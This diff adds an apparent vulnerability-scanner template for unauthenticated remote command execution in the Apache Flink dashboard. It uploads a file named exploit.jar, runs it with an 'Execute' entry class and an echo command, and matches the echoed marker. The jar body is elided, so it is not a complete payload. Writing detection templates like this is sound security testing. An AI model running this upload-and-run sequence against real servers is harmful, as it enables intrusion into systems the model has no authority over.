@@ -1,0 +1,65 @@
+id: apache-flink-unauthorized-rce
+info:
+  name: Apache Flink Unauthorized Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Apache Flink Dashboard allows unauthorized access, enabling attackers to upload malicious JAR files and execute arbitrary commands on the underlying system.
+  tags: command-execution, flink, rce
+  reference:
+    - https://fofa.so/
+http:
+  - raw:
+      - |
+        POST /jars/upload HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
+        Accept: application/json, text/plain, */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=---------------------------1234
+        Origin: http://{{Hostname}}
+        Connection: close
+        Referer: http://{{Hostname}}/
+
+        -----------------------------1234
+        Content-Disposition: form-data; name="jarfile"; filename="exploit.jar"
+        Content-Type: application/octet-stream
+
+        PK...
+        -----------------------------1234--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "success"
+      - type: regex
+        regex:
+          - "flink-web-upload/(.*?)\\.jar"
+    extractors:
+      - type: regex
+        group: 1
+        internal: true
+        regex:
+          - "flink-web-upload/(.*?)\\.jar"
+  - raw:
+      - |
+        POST /jars/{{jar}}.jar/run?entry-class=Execute&program-args=%22echo+1cca676950dfbab0c08b0f9b2fc5ed4c%22 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
+        Accept: application/json, text/plain, */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/json;charset=utf-8
+        Origin: http://{{Hostname}}
+        Connection: close
+        Referer: http://{{Hostname}}/
+
+        {"entryClass":"Execute","programArgs":"\"echo 1cca676950dfbab0c08b0f9b2fc5ed4c\""}
+    matchers:
+      - type: word
+        words:
+          - "1cca676950dfbab0c08b0f9b2fc5ed4c"
